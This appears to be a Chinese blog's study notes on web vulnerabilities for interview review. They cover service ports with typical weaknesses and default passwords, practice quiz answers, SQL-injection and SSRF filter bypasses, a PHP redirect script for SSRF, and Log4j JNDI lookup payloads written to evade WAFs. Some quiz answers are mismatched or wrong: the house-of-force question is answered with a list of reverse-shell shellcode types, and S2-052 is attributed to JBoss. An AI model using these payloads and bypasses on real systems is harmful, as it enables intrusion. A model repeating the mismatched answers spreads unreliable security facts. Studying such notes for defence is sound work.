RMI反序列化漏洞</span><br><span class=\"line\">1352：Lotus domino邮件服务端口，可能存在弱口令、信息泄露</span><br><span class=\"line\">1414：IBM WebSphere MQ服务端口</span><br><span class=\"line\">1433：SQL Server对外提供服务端口</span><br><span class=\"line\">1434：用于向请求者返回SQL Server使用了哪个TCP/IP端口</span><br><span class=\"line\">1521：oracle数据库端口</span><br><span class=\"line\">2049：NFS服务端口，可能存在NFS配置不当</span><br><span class=\"line\">2181：ZooKeeper监听端口，可能存在 ZooKeeper未授权访问漏洞</span><br><span class=\"line\">2375：Docker端口，可能存在 Docker未授权访问漏洞</span><br><span class=\"line\">2601:   Zebra ，默认密码zebr</span><br><span class=\"line\">3128:   squid ，匿名访问（可能内网漫游)</span><br><span class=\"line\">3268：LDAP目录访问协议，有可能存在注入、弱口令</span><br><span class=\"line\">3306：MySQL数据库端口，可能存在 弱口令暴力破解</span><br><span class=\"line\">3389：Windows远程桌面服务，可能存在 弱口令漏洞 或者 CVE-2019-0708 远程桌面漏洞复现</span><br><span class=\"line\">3690：SVN服务，可能存在SVN泄漏，未授权访问漏洞</span><br><span class=\"line\">4440：Rundeck，弱口令admin</span><br><span class=\"line\">4560：log4j SocketServer监听的端口，可能存在 log4j&lt;=1.2.17反序列化漏洞（CVE-2019-17571）</span><br><span class=\"line\">4750：BMC，可能存在 BMC服务器自动化RSCD代理远程代码执行(CVE-2016-1542)</span><br><span class=\"line\">4848：GlassFish控制台端口，可能存在弱口令admin/adminadmin</span><br><span class=\"line\">5000：SysBase/DB2数据库端口，可能存在爆破、注入漏洞</span><br><span class=\"line\">5432：PostGreSQL数据库的端口</span><br><span class=\"line\">5632：PyAnywhere服务端口，可能存在代码执行漏洞</span><br><span class=\"line\">5900/5901：VNC监听端口，可能存在 VNC未授权访问漏洞</span><br><span class=\"line\">5984：CouchDB端口，可能存在 CouchDB未授权访问漏洞</span><br><span class=\"line\">6379：Redis数据库端口，可能存在Redis未授权访问漏洞，传送门：Redis未授权访问漏洞</span><br><span class=\"line\">7001/7002：Weblogic，可能存在Weblogic反序列化漏洞，传送门：Weblogic反序列化漏洞</span><br><span class=\"line\">7180：Cloudera manager端口</span><br><span class=\"line\">8000：JDWP，可能存在JDWP远程代码执行漏洞。</span><br><span class=\"line\">8069：Zabbix服务端口，可能存在Zabbix弱口令导致的Getshell漏洞</span><br><span class=\"line\">8080：Tomcat、JBoss，可能存在Tomcat管理页面弱口令Getshell，JBoss未授权访问漏洞，传送门：Tomcat管理弱口令页面Getshell</span><br><span class=\"line\">8080-8090：可能存在web服务</span><br><span class=\"line\">8089：Jetty、Jenkins服务端口，可能存在反序列化，控制台弱口令等漏洞</span><br><span class=\"line\">8161：Apache ActiveMQ后台管理系统端口，默认口令密码为：admin:admin ，可能存在CVE-2016-3088漏洞，传送门：Apache ActiveMQ任意文件写入漏洞（CVE-2016-3088）</span><br><span class=\"line\">9000：fastcgi端口，可能存在远程命令执行漏洞</span><br><span class=\"line\">9001：Supervisord，可能存在Supervisord远程命令执行漏洞(CVE-2017-11610)，传送门：Supervisord远程命令执行漏洞(CVE-2017-11610)</span><br><span class=\"line\">9043/9090：WebSphere，可能存在WebSphere反序列化漏洞</span><br><span class=\"line\">9200/9300：Elasticsearch监听端口，可能存在 Elasticsearch未授权访问漏洞</span><br><span class=\"line\">10000：Webmin-Web控制面板，可能存在弱口令</span><br><span class=\"line\">10001/10002：JmxRemoteLifecycleListener监听的，可能存在Tomcat反序列化漏洞，传送门：Tomcat反序列化漏洞(CVE-2016-8735)</span><br><span class=\"line\">11211：Memcached监听端口，可能存在 Memcached未授权访问漏洞</span><br><span class=\"line\">27017/27018：MongoDB数据库端口，可能存在 MongoDB未授权访问漏洞</span><br><span class=\"line\">50000：SAP Management Console服务端口，可能存在 运程命令执行漏洞。</span><br><span class=\"line\">50070：Hadoop服务端口，可能存在 Hadoop未授权访问漏洞</span><br><span class=\"line\">61616：Apache ActiveMQ服务端口，可能存在 Apache ActiveMQ任意文件写入漏洞（CVE-2016-3088）复现</span><br><span class=\"line\">60020：hbase.regionserver.port，HRegionServer的RPC端口</span><br><span class=\"line\">60030：hbase.regionserver.info.port，HRegionServer的http端口</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h3 id=\"15-一些最新的漏洞\"><a href=\"#15-一些最新的漏洞\" class=\"headerlink\" title=\"15.一些最新的漏洞\"></a>15.一些最新的漏洞</h3><h5 id=\"Log4j2\"><a href=\"#Log4j2\" class=\"headerlink\" title=\"Log4j2\"></a>Log4j2</h5><p><a class=\"link\"   href=\"https://juejin.cn/post/7202514143341002789\" >https://juejin.cn/post/7202514143341002789<i class=\"fas fa-external-link-alt\"></i></a></p>\n<h5 id=\"spring-core-rce-2022-03-29\"><a href=\"#spring-core-rce-2022-03-29\" class=\"headerlink\" title=\"spring-core-rce-2022-03-29\"></a>spring-core-rce-2022-03-29</h5><p><a class=\"link\"   href=\"https://blog.csdn.net/weixin_45632448/article/details/124190382\" >https://blog.csdn.net/weixin_45632448/article/details/124190382<i class=\"fas fa-external-link-alt\"></i></a></p>\n<h3 id=\"16-常见的web漏洞\"><a href=\"#16-常见的web漏洞\" class=\"headerlink\" title=\"16.常见的web漏洞\"></a>16.常见的web漏洞</h3><ul>\n<li>任意文件上传</li>\n<li>任意文件下载</li>\n<li>逻辑漏洞</li>\n<li>反序列化漏洞</li>\n</ul>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><h2 id=\"-1\"><a href=\"#-1\" class=\"headerlink\" title=\"\"></a></h2><hr>\n<h1 id=\"练习思考题\"><a href=\"#练习思考题\" class=\"headerlink\" title=\"练习思考题\"></a>练习思考题</h1><h3 id=\"1-堆溢出覆盖top-chunk的大小-house-of-force-的说法有哪些？\"><a href=\"#1-堆溢出覆盖top-chunk的大小-house-of-force-的说法有哪些？\" class=\"headerlink\" title=\"1.堆溢出覆盖top chunk的大小(house of force)的说法有哪些？\"></a>1.堆溢出覆盖top chunk的大小(house of force)的说法有哪些？</h3><ol>\n<li>Windows Meterpreter Reverse TCP shellcode：这种 shellcode 可以与 Metasploit 的 Meterpreter 模块配合使用，实现远程代码执行、获取系统信息等功能。</li>\n<li>Windows Reverse TCP shellcode：这种 shellcode 可以在 Windows 系统上运行，将一个远程 shell 连接回攻击者的主机。</li>\n<li>Windows Reverse HTTP shellcode：这种 shellcode 可以在 Windows 系统上运行，将一个 HTTP 连接回攻击者的主机。</li>\n<li>Beacon Payload shellcode：这种 shellcode 可以使用 Cobalt Strike 的 Beacon 功能，实现命令执行、文件传输等功能。</li>\n<li>Linux Reverse TCP shellcode：这种 shellcode 可以在 Linux 系统上运行，将一个远程 shell 连接回攻击者的主机。</li>\n<li>Mac Reverse TCP shellcode：这种 shellcode 可以在 Mac 系统上运行，将一个远程 shell 连接回攻击者的主机。</li>\n</ol>\n<h3 id=\"2-6379-8009端口对应的漏洞是\"><a href=\"#2-6379-8009端口对应的漏洞是\" class=\"headerlink\" title=\"2.6379,8009端口对应的漏洞是\"></a>2.6379,8009端口对应的漏洞是</h3><ul>\n<li>6379是redis未授权访问漏洞</li>\n<li>8009是<code>Apache-Tomcat-Ajp漏洞</code>，tomcat默认开启ajp服务（8009端口）</li>\n</ul>\n<h3 id=\"3-Cobalt-strike-可以生成哪些类型的shellcode\"><a href=\"#3-Cobalt-strike-可以生成哪些类型的shellcode\" class=\"headerlink\" title=\"3.Cobalt strike 可以生成哪些类型的shellcode?\"></a>3.Cobalt strike 可以生成哪些类型的shellcode?</h3><p>搜不到。。。</p>\n<h3 id=\"4-Apache-文件解析漏洞的原理？\"><a href=\"#4-Apache-文件解析漏洞的原理？\" class=\"headerlink\" title=\"4.Apache 文件解析漏洞的原理？\"></a>4.Apache 文件解析漏洞的原理？</h3><blockquote>\n<p>apache的解析漏洞依赖于一个特性：apache默认一个文件可以有多个以点分割的后缀，比如test.php.abc，当最右边的后缀无法识别（不在mime.types文件内），则继续向左识别，知道识别到合法后缀才能进行解析，与windows不同，apache对文件的名解析不是仅仅认识最后一个后缀名，而是从右向左，依此识别，直到遇到自己可以解析的文件为止。</p>\n</blockquote>\n<p>当phpinfo.php被禁止时，phpinfo.php.abc可执行</p>\n<h3 id=\"5-什么中间件存在短文件名漏洞？\"><a href=\"#5-什么中间件存在短文件名漏洞？\" class=\"headerlink\" title=\"5. 什么中间件存在短文件名漏洞？\"></a>5. 什么中间件存在短文件名漏洞？</h3><p><strong>iis</strong></p>\n<h3 id=\"6-xxe漏洞各个语言支持的伪协议有哪些\"><a href=\"#6-xxe漏洞各个语言支持的伪协议有哪些\" class=\"headerlink\" title=\"6.xxe漏洞各个语言支持的伪协议有哪些\"></a>6.xxe漏洞各个语言支持的伪协议有哪些</h3><p>可利用php:&#x2F;&#x2F;filter伪协议</p>\n<h3 id=\"7-S2-052漏洞是由于什么造成的？\"><a href=\"#7-S2-052漏洞是由于什么造成的？\" class=\"headerlink\" title=\"7.S2_052漏洞是由于什么造成的？\"></a>7.S2_052漏洞是由于什么造成的？</h3><p>此漏洞主要是由于<strong>JBoss中 &#x2F;jmx-console&#x2F;HtmlAdaptor 路径对外开放</strong>，并且没有任何身份验证机制，导致攻击者可以进入到JMX控制台，并在其中执行任何功能。</p>\n<h3 id=\"8-Weblogic-常见的漏洞有哪些？\"><a href=\"#8-Weblogic-常见的漏洞有哪些？\" class=\"headerlink\" title=\"8.Weblogic 常见的漏洞有哪些？\"></a>8.Weblogic 常见的漏洞有哪些？</h3><ul>\n<li><strong>XMLDecoder反序列化漏洞</strong></li>\n<li><strong>T3协议反序列化漏洞</strong></li>\n<li><strong>未授权访问漏洞</strong></li>\n<li><strong>命令执行漏洞</strong></li>\n<li><strong>IIOP协议反序列化漏洞</strong></li>\n<li><strong>SSRF漏洞</strong></li>\n</ul>\n<h3 id=\"9-Jboss-常见的漏洞有哪些？\"><a href=\"#9-Jboss-常见的漏洞有哪些？\" class=\"headerlink\" title=\"9.Jboss 常见的漏洞有哪些？\"></a>9.Jboss 常见的漏洞有哪些？</h3><ul>\n<li><strong>访问控制不严导致的漏洞</strong></li>\n<li><strong>反序列化导致的漏洞</strong></li>\n</ul>\n<h3 id=\"10-Struts2-常见的漏洞有哪些？\"><a href=\"#10-Struts2-常见的漏洞有哪些？\" class=\"headerlink\" title=\"10.Struts2 常见的漏洞有哪些？\"></a>10.Struts2 常见的漏洞有哪些？</h3><ul>\n<li>反序列化漏洞</li>\n</ul>\n<h3 id=\"11-Fastbin-怎么利用？\"><a href=\"#11-Fastbin-怎么利用？\" class=\"headerlink\" title=\"11.Fastbin 怎么利用？\"></a>11.Fastbin 怎么利用？</h3><p>使用流程如下：</p>\n<ol>\n<li>申请同样大小的两个内存块，并将它们都释放，这样这两个内存块就会被放入 Fastbin 链表中。</li>\n<li>重新申请同样大小的内存块，此时 glibc 会从 Fastbin 链表中返回其中一个内存块的地址，作为本次申请的内存块。</li>\n<li>利用本次申请返回的内存块地址，修改其中保存的值为 Fastbin 链表中未释放的内存块的地址。</li>\n<li>再次申请同样大小的内存块，此时 glibc 会从 Fastbin 链表中返回之前修改过的内存块地址，作为本次申请的内存块。</li>\n</ol>\n<h3 id=\"12-Ssrf-攻击的目标为？\"><a href=\"#12-Ssrf-攻击的目标为？\" class=\"headerlink\" title=\"12.Ssrf 攻击的目标为？\"></a>12.Ssrf 攻击的目标为？</h3><p><strong><u>外网无法访问的内部系统</u></strong></p>\n<h3 id=\"13-ssrf-是否可以通过过滤get或post参数进行防御？\"><a href=\"#13-ssrf-是否可以通过过滤get或post参数进行防御？\" class=\"headerlink\" title=\"13.ssrf 是否可以通过过滤get或post参数进行防御？\"></a>13.ssrf 是否可以通过过滤get或post参数进行防御？</h3><p>不行</p>\n<h3 id=\"14-Log4j-怎么绕过？\"><a href=\"#14-Log4j-怎么绕过？\" class=\"headerlink\" title=\"14.Log4j 怎么绕过？\"></a>14.Log4j 怎么绕过？</h3><ul>\n<li><p><strong>不出现port，避免被waf匹配ip:port</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$&#123;jndi:ldap:192.168.1.1/a&#125;</span><br><span class=\"line\"> $&#123;jndi:ldap:192.168.1.1:/a&#125; </span><br><span class=\"line\">注意此时需要ldap服务端口为389</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n</li>\n<li><p><strong>对IP添加包裹</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$&#123;jndi:ldap://[192.168.34.96]/a&#125; </span><br><span class=\"line\">$&#123;jndi:ldap://[192.168.34.96]]/a&#125; </span><br><span class=\"line\"> LdapURL取出&quot;[ip]&quot;，LdapCtx去除[]获得ip，两种情况下端口都是389</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></li>\n</ul>\n<h3 id=\"15-ogg是否是php的伪协议？\"><a href=\"#15-ogg是否是php的伪协议？\" class=\"headerlink\" title=\"15.ogg是否是php的伪协议？\"></a>15.ogg是否是php的伪协议？</h3><p>不是。OGG是一种开放格式的媒体容器，通常用于存储音频和视频文件。它不是PHP的伪协议，PHP的伪协议是一种特殊的协议，用于在PHP中访问各种资源，如文件、网络资源等。PHP的伪协议以特殊的前缀开头，例如file:&#x2F;&#x2F;表示文件协议，http:&#x2F;&#x2F;表示HTTP协议等。</p>\n<h3 id=\"16-Zip-伪协议利用对应的php版本号为？\"><a href=\"#16-Zip-伪协议利用对应的php版本号为？\" class=\"headerlink\" title=\"16. Zip:&#x2F;&#x2F;伪协议利用对应的php版本号为？\"></a>16. Zip:&#x2F;&#x2F;伪协议利用对应的php版本号为？</h3><p><code>zip://</code> 伪协议是在 PHP 5.2.0 版本中引入的，因此在该版本及更高版本的 PHP 中都可以使用。该伪协议允许 PHP 脚本以与本地文件系统相同的方式访问 ZIP 存档文件中的文件。</p>\n<h3 id=\"17-文件上传怎么绕过黑名单-asp后缀的过滤？\"><a href=\"#17-文件上传怎么绕过黑名单-asp后缀的过滤？\" class=\"headerlink\" title=\"17.文件上传怎么绕过黑名单.asp后缀的过滤？\"></a>17.文件上传怎么绕过黑名单.asp后缀的过滤？</h3><h3 id=\"18-Nginx-apache是否存在弱口令？\"><a href=\"#18-Nginx-apache是否存在弱口令？\" class=\"headerlink\" title=\"18.Nginx,apache是否存在弱口令？\"></a>18.Nginx,apache是否存在弱口令？</h3><p>均存在</p>\n<h3 id=\"19-Dom-xss和反射型xss的区别是什么？\"><a href=\"#19-Dom-xss和反射型xss的区别是什么？\" class=\"headerlink\" title=\"19.Dom xss和反射型xss的区别是什么？\"></a>19.Dom xss和反射型xss的区别是什么？</h3><blockquote>\n<p>DOM 型 XSS 漏洞和反射型 XSS 漏洞的区别在于攻击者注入恶意脚本的位置不同。反射型 XSS 漏洞将恶意脚本注入到响应页面中，而 DOM 型 XSS 漏洞将恶意脚本注入到浏览器的 DOM 中。</p>\n</blockquote>\n<h3 id=\"20-Ms17-010漏洞是那个端口造成的？\"><a href=\"#20-Ms17-010漏洞是那个端口造成的？\" class=\"headerlink\" title=\"20.Ms17_010漏洞是那个端口造成的？\"></a>20.Ms17_010漏洞是那个端口造成的？</h3><p>445端口</p>\n<h3 id=\"21-Sqlmap-中要使用随机user-agent应该使用什么参数？\"><a href=\"#21-Sqlmap-中要使用随机user-agent应该使用什么参数？\" class=\"headerlink\" title=\"21.Sqlmap 中要使用随机user-agent应该使用什么参数？\"></a>21.Sqlmap 中要使用随机user-agent应该使用什么参数？</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">--random-agent</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"22-Xp-cmdshell-是那个数据库中含有的？\"><a href=\"#22-Xp-cmdshell-是那个数据库中含有的？\" class=\"headerlink\" title=\"22.Xp_cmdshell 是那个数据库中含有的？\"></a>22.Xp_cmdshell 是那个数据库中含有的？</h3><p><code> Microsoft SQL Server 数据库</code></p>\n<h3 id=\"23-Symlink函数是否可以执行系统命令？\"><a href=\"#23-Symlink函数是否可以执行系统命令？\" class=\"headerlink\" title=\"23.Symlink函数是否可以执行系统命令？\"></a>23.Symlink函数是否可以执行系统命令？</h3><p>不可以</p>\n<h3 id=\"24-Samba-wannacry溢出漏洞怎么修复？\"><a href=\"#24-Samba-wannacry溢出漏洞怎么修复？\" class=\"headerlink\" title=\"24.Samba wannacry溢出漏洞怎么修复？\"></a>24.Samba wannacry溢出漏洞怎么修复？</h3><ul>\n<li>升级 Samba：升级到最新版本的 Samba，这将修复许多与安全有关的漏洞，包括 EternalBlue 漏洞。</li>\n<li>禁用 SMBv1：在 Samba 服务器上禁用 SMBv1 协议。这是因为 WannaCry 利用的是 SMBv1 协议的漏洞。在 Windows 系统上禁用 SMBv1 协议同样可以减少系统受到攻击的风险。</li>\n<li>更新操作系统：更新 Windows 操作系统以修补 SMBv1 漏洞。</li>\n<li>加强安全设置：加强 Samba 服务器的安全设置，包括访问控制、身份验证和日志记录等。例如，可以配置防火墙规则以限制对 Samba 服务器的访问，并配置强密码策略以增强身份验证的安全性。</li>\n<li>实施安全性检查：定期对 Samba 服务器进行安全性检查，以确保其处于最新的安全状态，并及时修复发现的漏洞。</li>\n</ul>\n","site":{"data":{"keep":{"base_info":{"primary_color":"#0066cc","title":"P1taya","author":"P1taya","avatar":"/images/p1taya.jpg","logo":"/images/p1taya.jpg","favicon":"/images/p1taya.jpg"},"menu":{"home":"/ || fa-solid fa-home","archives":"/archives || fa-solid fa-box-archive","categories":"/categories || fa-solid fa-layer-group","links":"/links || fa-solid fa-link","about":"/about || fa-solid fa-user-graduate","photos":"/photos || fa-solid fa-image"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"人后的苦尚且还能克服 || 人前的尊严却无比脆弱","hitokoto":false},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"created || fa-solid fa-home","post_datetime_format":"YYYY-MM-DD HH:mm:ss"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":false,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"obsidian"},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":false},"lazyload":{"enable":true},"footer":{"since":2022,"word_count":true},"inject":{"enable":true,"css":["/css/demo1.css"],"js":[null]}},"links":[{"name":"小黄dog","link":"https://wuster.store/","avatar":"https://wuster.store/images/favicon.ico"},{"name":"🐶✌️","link":"https://fushuling.com/","avatar":"https://fushuling-1309926051.cos.ap-shanghai.myqcloud.com/avatar.jpg"}]}},"more":"<h1 id=\"web漏洞复习\"><a href=\"#web漏洞复习\" class=\"headerlink\" title=\"web漏洞复习\"></a>web漏洞复习</h1><h3 id=\"1-owasp-top-10\"><a href=\"#1-owasp-top-10\" class=\"headerlink\" title=\"1.owasp top 10\"></a>1.owasp top 10</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.SQL注入</span><br><span class=\"line\">2.失效的身份认证和会话管理</span><br><span class=\"line\">3.跨站脚本攻击XSS</span><br><span class=\"line\">4.直接引用不安全的对象</span><br><span class=\"line\">5.安全配置错误</span><br><span class=\"line\">6.敏感信息泄露</span><br><span class=\"line\">7.缺少功能级的访问控制</span><br><span class=\"line\">8.跨站请求伪造CSRF</span><br><span class=\"line\">9.实验含有已知漏洞的组件</span><br><span class=\"line\">10.未验证的重定向和转发</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"2-sql注入\"><a href=\"#2-sql注入\" class=\"headerlink\" title=\"2.sql注入\"></a>2.sql注入</h3><p><strong>sql注入原理</strong></p>\n<blockquote>\n<p>产生SQL注入漏洞的根本原因在于代码中没有对用户输入项进行验证和处理便直接拼接</p>\n<p>到查询语句中。利用SQL注入漏洞，攻击者可以在应用的查询语句中插入自己的SQL代码并传递</p>\n<p>给后台SQL服务器时加以解析并执行。</p>\n</blockquote>\n<p><strong>sql注入类型</strong></p>\n<p>按照注入点类型分类可分为</p>\n<ul>\n<li>数字型注入</li>\n<li>字符型注入</li>\n</ul>\n<p>按照执行效果分类可分为</p>\n<ul>\n<li>盲注</li>\n<li>报错注入</li>\n<li>联合查询</li>\n<li>堆叠注入</li>\n<li>宽字节注入</li>\n<li>二次注入</li>\n</ul>\n<p><strong>sql注入危害</strong></p>\n<ol>\n<li>攻击者未经授权可以访问数据库中的数据，盗取用户的隐私以及个人信息，造成用户的信息泄露。</li>\n<li>可以对数据库的数据进行增加或删除操作，例如私自添加或删除管理员账号。</li>\n<li>如果网站目录存在写入权限，可以写入网页木马。攻击者进而可以对网页进行篡改，发布一些违法信息等。</li>\n<li>经过提权等步骤，服务器最高权限被攻击者获取。攻击者可以远程控制服务器，安装后门，得以修改或控制操作系统。</li>\n</ol>\n<p><strong>报错注入常用函数</strong></p>\n<ul>\n<li>updatexml()</li>\n<li>extractvalue()</li>\n<li>floor()</li>\n</ul>\n<p><strong>sql注入绕过</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">绕过空格（注释符/* */，%a0）</span><br><span class=\"line\">括号绕过空格</span><br><span class=\"line\">引号绕过（使用十六进制）</span><br><span class=\"line\">逗号绕过（limit使用from或者offset）（substr使用from for属于逗号）</span><br><span class=\"line\">比较符号（&lt;&gt;）绕过（使用greatest()）</span><br><span class=\"line\">and=&amp;&amp;  or=||</span><br><span class=\"line\">=  用 like 绕过</span><br><span class=\"line\">大小写绕过</span><br><span class=\"line\">双写绕过</span><br><span class=\"line\">特殊编码绕过</span><br></pre></td></tr></table></figure>\n\n\n\n<p><strong>sql注入经常出现在什么地方</strong></p>\n<ul>\n<li>登录界面</li>\n<li>删除处</li>\n<li>搜索框</li>\n</ul>\n<p><strong>Sql server 相关知识</strong></p>\n<p><a class=\"link\"   href=\"https://zhuanlan.zhihu.com/p/74546690\" >https://zhuanlan.zhihu.com/p/74546690<i class=\"fas fa-external-link-alt\"></i></a></p>\n<h3 id=\"3-文件上传\"><a href=\"#3-文件上传\" class=\"headerlink\" title=\"3.文件上传\"></a>3.文件上传</h3><p><strong>文件上传的危害？</strong></p>\n<blockquote>\n<p>文件上传漏洞危害极大因为可以直接上传恶意代码到服务器上，可能会造成服务器的<strong>网页篡改、网站被挂马、服务器被远程控制、被安装后门等严重的后果</strong></p>\n</blockquote>\n<p><strong>文件上传怎么防御</strong></p>\n<ul>\n<li>客户端检测检测（js检测）</li>\n<li>服务端检测(MIME检测)</li>\n<li>服务端检测（扩展名检测）</li>\n<li>增加白名单</li>\n</ul>\n<p><strong>文件上传怎么绕过(白名单，黑名单，前端等)？</strong></p>\n<ul>\n<li>.htaccess绕过</li>\n<li>.user.ini绕过</li>\n<li>%00截断绕过</li>\n</ul>\n<h3 id=\"3-SSRF漏洞\"><a href=\"#3-SSRF漏洞\" class=\"headerlink\" title=\"3.SSRF漏洞\"></a>3.SSRF漏洞</h3><blockquote>\n<p>漏洞原理 <strong>SSRF</strong>（Server-Side Request  Forgery，服务器端请求伪造）是一种由攻击者构造请求，由服务器端发起请求的安全漏洞，本质上是属于信息泄露漏洞。  ssrf攻击的目标是从外网无法访问的内部系统（正是因为他是有服务器端发起的，所以他能够请求到与他相连而与外网隔离的内部系统）  很多web应用都提供了从其他的服务器上获取数据的功能（百度识图，给出一串URL就能识别出图片）。  使用用户指定的URL，web应用可以获取图片，下载文件，读取文件内容等。  这个功能如果被恶意使用，可以利用存在缺陷的web应用作为代理，攻击远程和本地的服务器。 一般情况下，  SSRF攻击的目标是外网无法访问的内部系统，黑客可以利用SSRF漏洞获取内部系统的一些信息 。</p>\n</blockquote>\n<p><strong>ssrf漏洞利用</strong></p>\n<ul>\n<li>能扫描内部网络，获取端口，服务信息</li>\n<li>攻击运行在内网或本地的应用程序。</li>\n<li>对内网web进行指纹识别</li>\n<li>对内部主机和端口发送请求包进行攻击</li>\n<li>file协议读取本地文件</li>\n</ul>\n<p><strong>Ssrf漏洞防御</strong></p>\n<ul>\n<li>限制请求的端口只能为Web端口，只允许访问HTTP和HTTPS的请求</li>\n<li>限制不能访问内网的IP，以防止对内网进行攻击</li>\n<li>屏蔽返回的详细信息</li>\n</ul>\n<p><strong>Ssrf漏洞绕过</strong></p>\n<ul>\n<li><p>@符号绕过</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.xxx.com@www.kxsy.work/</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>IP地址转换</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">例如：120.26.86.156</span><br><span class=\"line\">二进制 = 1111000000110100101011010011100</span><br><span class=\"line\">十六进制 = 0x781A569C</span><br><span class=\"line\">十进制 = 2014992028</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>转换短网址</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https://www.985.so/</span><br><span class=\"line\">例：http://www.kxsy.work/ = http://u6.gg/ks69x</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>特殊符号替换绕过</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">例：</span><br><span class=\"line\">http://www.kxsy.work/ = http://www。kxsy。work/</span><br><span class=\"line\">localhost或者0.0.0.0</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>302跳转绕过</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php  </span><br><span class=\"line\">$schema = $_GET[&#x27;s&#x27;];</span><br><span class=\"line\">$ip     = $_GET[&#x27;i&#x27;];</span><br><span class=\"line\">$port   = $_GET[&#x27;p&#x27;];</span><br><span class=\"line\">$query  = $_GET[&#x27;q&#x27;];</span><br><span class=\"line\">if(empty($port))&#123;  </span><br><span class=\"line\">    header(&quot;Location: $schema://$ip/$query&quot;); </span><br><span class=\"line\">&#125; else &#123;</span><br><span class=\"line\">    header(&quot;Location: $schema://$ip:$port/$query&quot;); </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>xio.ip绕过，会解析到子域</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://10.0.0.1.xip.io = 10.0.0.1</span><br><span class=\"line\">www.10.0.0.1.xip.io= 10.0.0.1</span><br><span class=\"line\">http://mysite.10.0.0.1.xip.io = 10.0.0.1</span><br><span class=\"line\">foo.http://bar.10.0.0.1.xip.io = 10.0.0.1</span><br><span class=\"line\">10.0.0.1.xip.name resolves to 10.0.0.1</span><br><span class=\"line\">www.10.0.0.2.xip.name resolves to 10.0.0.2</span><br><span class=\"line\">foo.10.0.0.3.xip.name resolves to 10.0.0.3</span><br><span class=\"line\">bar.baz.10.0.0.4.xip.name resolves to 10.0.0.4</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>用Enclosed alphanumerics绕过</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">利用Enclosed alphanumerics</span><br><span class=\"line\">ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ &gt;&gt;&gt; http://example.com</span><br></pre></td></tr></table></figure></li>\n</ul>\n<h3 id=\"4-XXE漏洞\"><a href=\"#4-XXE漏洞\" class=\"headerlink\" 